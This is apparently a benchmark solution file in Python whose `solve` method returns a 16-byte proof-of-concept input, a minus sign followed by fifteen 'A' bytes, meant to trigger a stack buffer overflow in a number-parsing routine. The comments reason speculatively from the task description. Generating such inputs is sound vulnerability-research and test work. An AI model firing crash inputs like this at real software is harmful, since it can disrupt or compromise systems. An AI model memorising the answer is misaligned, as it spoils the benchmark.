import os
import subprocess
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability involves improper parsing when a minus sign is present
        # but the value is not "infinity". Ground truth length is 16 bytes.
        # We'll create a minimal payload that triggers stack buffer overflow.
        
        # Based on the description: leading minus sign causes parsing to advance
        # even when not an infinity value. This suggests the code expects
        # something like "-inf" or "-infinity" but doesn't properly validate
        # the full string length before copying/processing.
        
        # Craft a 16-byte payload:
        # 1. Start with '-' (triggers the vulnerable code path)
        # 2. Add padding to reach 16 bytes total
        # 3. Ensure it's NOT a valid infinity representation
        return b'-' + b'A' * 15
